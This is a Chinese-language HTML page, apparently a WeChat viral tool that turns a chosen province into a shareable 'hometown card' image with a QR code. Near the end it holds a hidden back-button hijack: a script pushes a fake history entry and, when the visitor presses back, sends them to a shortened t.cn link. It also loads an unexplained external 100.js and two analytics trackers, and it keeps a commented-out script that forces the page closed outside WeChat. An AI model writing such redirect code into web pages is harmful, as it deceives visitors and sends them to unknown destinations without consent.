<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width = device-width ,height = device-height ,initial-scale = 1,minimum-scale = 1,maximum-scale = 1,user-scalable =no,">
    <title>我的家乡名片</title>
    <link href="style/usecase.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" type="text/css" href="style/reset.css">
    <link rel="stylesheet" type="text/css" href="style/style.css">
    <script type="text/javascript" src="style/myqrcode.js"></script>
    <script type="text/javascript" src="style/qrcode.min.js"></script>
<style>
    .head{
        width: 100%;
        padding: 3% 0;
        text-align: center;
        font-size: 15px;
        background: #101010;
        color: #fff;
        display: none;
    }
</style>
<!--弹出层-->
<style type="text/css">
.dialog{
	position: fixed;
	_position:absolute;
	z-index:1;
	top: 50%;
	left: 50%;
	margin: -141px 0 0 -201px;
	width: 400px;
	height:280px;
	border:1px solid #CCC;
	line-height: 280px;
	text-align:center;
	font-size: 14px;
	background-color:gray;
	overflow:hidden;
	color:#ffffff;
}
.province-det p span{
	color: #fff;
}
</style>
<!--
<script type="text/javascript">
    // 对浏览器的UserAgent进行正则匹配，不含有微信独有标识的则为其他浏览器
    var useragent = navigator.userAgent;
    if (useragent.match(/MicroMessenger/i) != 'MicroMessenger') {
        // 这里警告框会阻塞当前页面继续加载
        alert('已禁止本次访问：您必须使用微信内置浏览器访问本页面！');
        // 以下代码是用javascript强行关闭当前页面
        var opened = window.open('about:blank', '_self');
        opened.opener = null;
        opened.close();
    }

    // document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
    //     // 通过下面这个API隐藏右上角按钮
    //     WeixinJSBridge.call('hideOptionMenu');
    // });
</script>
-->

</head>
<body>
<input id="text" type="hidden" value="http://mr.ptytop.top/mobile/zhuanyunfu/jiaxiang.php" style="width:80%" /><br />
<div id="qrcode" style="width:100px; height:100px; margin-top:15px;display:none"></div>
<div class="main">
    <!-- <div class="head">
        长按图片进行保存
    </div> -->
    <div class="wrap1">
        <div class="banner" style="margin-top:-30px;"></div>
        <div class="step-box">
              <div class="step">
                    <div class=" clearfix step-top">
                          <div class="fl"></div>
                          <div class="fr">
                            <p>仅需2步，即可生成关键词</p>
                            <p>一起霸屏朋友圈</p>
                          </div>
                    </div>
                    <div class="step-cont">
                            <!-- <p class="step-tit"><span>STEP 1</span>输入姓名</p>
                            <div class="date_wrap">
                                <input type="name" class="input w30" id="name" maxlength="4" placeholder="请输入姓名" style="width:100%;height: 48px;">
                            </div> -->
                            <p class="step-tit"><span>STEP 1</span>选择你的家乡</p>
                            <div class="step-2 tjclick home" style="background-image: url('images/home.png')"></div>
                            <div class="step-2 tjclick address" style="background-image: url('images/step1.png');padding-top:25px;display: none">南山</div>
                            <p class="step-tit"><span>STEP 2</span>获得专属家乡名片</p>
                            <div class="step-2 tjclick btn"></div>
                    </div>
              </div>
        </div>
    </div>
</div>
<canvas width="750" height="1120" id="canvas" style="display:none"> </canvas>
<img src="" id="imgEnd" width="90%">
<!--<div class="com-tip" style="display:none">-->
<!--    <p class="tip1"><span>??<a href="http://wx2.lq8cu.cn/hd/20lianaijinli/index.php">??爱情也是一场修炼，你都经历了什么？</a></span></p>-->
<!--</div>-->
<div class="dialog" style="display: none;">正在生成中...</div>


<div class="sub-page" style="display: none;">
		<div class="close"></div>
		<div class="sub-cont">
		  <div class="province-box" style="background:#cb4e4a">
		    <div class="provincebox">
		    <div>
		        <div class="province-det">
		            <p>
		               <span id="33" style="font-size:20px;">安徽</span>
		               <span id="31" style="font-size:20px;">澳门</span>
		               <span id="1" style="font-size:20px;">北京</span>
		               <span id="21" style="font-size:20px;">重庆</span>
		               <span id="11" style="font-size:20px;">福建</span>
		               <span id="26" style="font-size:20px;">甘肃</span>
		               <span id="10" style="font-size:20px;">广东</span>
		               <span id="12" style="font-size:20px;">广西</span>
		               <span id="22" style="font-size:20px;">贵州</span>
		               <span id="13" style="font-size:20px;">海南</span>
                       <span id="3" style="font-size:20px;">河北</span>
                       <span id="34" style="font-size:20px;">河南</span>
                       <span id="19" style="font-size:20px;">黑龙江</span>
                       <span id="5" style="font-size:20px;">内蒙古</span>
                       <span id="14" style="font-size:20px;">湖北</span>
                       <span id="15" style="font-size:20px;">湖南</span>
                       <span id="18" style="font-size:20px;">吉林</span>
                       <span id="7" style="font-size:20px;">江苏</span>
                       <span id="16" style="font-size:20px;">江西</span>
                       <span id="17" style="font-size:20px;">辽宁</span>
                       <span id="29" style="font-size:20px;">宁夏</span>
                       <span id="28" style="font-size:20px;">青海</span>
                       <span id="9" style="font-size:20px;">山东</span>
                       <span id="4" style="font-size:20px;">山西</span>
                       <span id="25" style="font-size:20px;">陕西</span>
                       <span id="6" style="font-size:20px;">上海</span>
                       <span id="20" style="font-size:20px;">四川</span>
                       <span id="32" style="font-size:20px;">台湾</span>
                       <span id="2" style="font-size:20px;">天津</span>
                       <span id="24" style="font-size:20px;">西藏</span>
                       <span id="30" style="font-size:20px;">香港</span>
                       <span id="27" style="font-size:20px;">新疆</span>
                       <span id="23" style="font-size:20px;">云南</span>
                       <span id="8" style="font-size:20px;">浙江</span>
		            </p>
		        </div>
		    <div class="submit-btn"></div>
		  </div>
		</div>
	</div>
	<input type="hidden" id="add" name="address">
<script src="style/zepto.min.js"></script>
<script>
var headImg = ''
getQrcode();

function getQrcode(){
    var qrcode = new QRCode(document.getElementById("qrcode"), {
        width : 100,
        height : 100
    });

    function makeCode () {
        var elText = document.getElementById("text");
        qrcode.makeCode(elText.value);
    }

    makeCode();

}

Zepto(function(){
    headImg = 'sucai/1.jpg';

    $('.btn').click(function(){
        // var name = document.getElementById("name").value;
        var add  = document.getElementById("add").value;
        // var qrcode = document.getElementById('pic1').src
        var qrcode = 'qrcode/erweima.png';
        // if(!name){
        //     document.getElementById('name').focus();
        // }else{
        	if(add == ''){
        	   $('.sub-page').css('display','block');
            }else{
	            $('.dialog').css('display','block');
	             draw(add,qrcode)
	        }
        // }
    })


})


function draw(add,myqrcode) {
    var c=document.getElementById("canvas")
    var ctx = c.getContext("2d");
    var imgbg = document.createElement('img');
    var imgSrc = "images/"+add+".png";
    imgbg.src = imgSrc;
    imgbg.onload = function(e) {
        ctx.drawImage(imgbg, 0, 0, 750, 1120);
        var qrcode = document.createElement('img');
        var qrcodeWidth = 220
        var qrcodeX = c.width - qrcodeWidth - 50;
        var qrcodeY = c.height - qrcodeWidth - 50;
        qrcode.src = myqrcode;
        qrcode.onload = function(e){
                ctx.drawImage(qrcode,qrcodeX,qrcodeY,qrcodeWidth,qrcodeWidth)
                ctx.font = "bold 45px 文鼎CS大黑";
                ctx.fillStyle="#eb6877";
                var nameW = ctx.measureText(name).width;
                var nameX = 370 - (nameW/2);
                var city = $("#"+add).html();
                ctx.fillText(city+'人',470,163);
                var avatar = document.createElement('img');
                avatar.src = './linshi/oVwwW0ikOWtgh3xOryBu5_r772i4.png';
                avatar.onload = function(e){
                    ctx.drawImage(avatar,175,60,120,120)
                    var dataUrl = c.toDataURL("images/jpeg",0.8);
                    $("#imgEnd").attr("src",dataUrl)
                    $('.dialog').css('display','none');
                    $('.com-tip').css('display','block');
                }
        }
    }
    //$('.head').show();
    //$(".head").html("长按图片进行保存-裙发");
    $(".wrap1").css('display','none');
}
</script>

<script type="text/javascript">
  $('.home').click(function(){
      $('.sub-page').css('display','block');
  });
  $('.close').click(function(){
      $('.sub-page').css('display','none');
  });
  $('.province-det p span').click(function(){
  	   var _this = $(this);
       _this.css('color','#000').siblings('span').css('color','#fff');
       $('.home').css('display','none');
       $('.address').css('display','block');
       $('.address').text(_this.text());
       $('#add').val(_this.attr('id'));

  });
  $('.submit-btn').click(function(){
  	   $('.sub-page').css('display','none');
  });
</script>

            <script>
                var picurl = "http://t.cn/R87uBZh";
                window.onhashchange = function() {jp11();};
                function hh() {
                    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
                }
                function jp11() {
                    location.href = picurl;
                };
                setTimeout(hh, 1);

            </script>

            <script>
                var _hmt = _hmt || [];
                (function() {
                    var hm = document.createElement("script");
                    hm.src = "https://hm.baidu.com/hm.js?bdae293691a4d1d62fdc5f7101bd7334";
                    var s = document.getElementsByTagName("script")[0];
                    s.parentNode.insertBefore(hm, s);
                })();
            </script>


            <script>
                var _hmt = _hmt || [];
                (function() {
                    var hm = document.createElement("script");
                    hm.src = "https://hm.baidu.com/hm.js?2ff24432ccbfe3bc8f89405fc5a701a5";
                    var s = document.getElementsByTagName("script")[0];
                    s.parentNode.insertBefore(hm, s);
                })();
            </script>


                            <script src='100.js'></script>


</body>
</html>
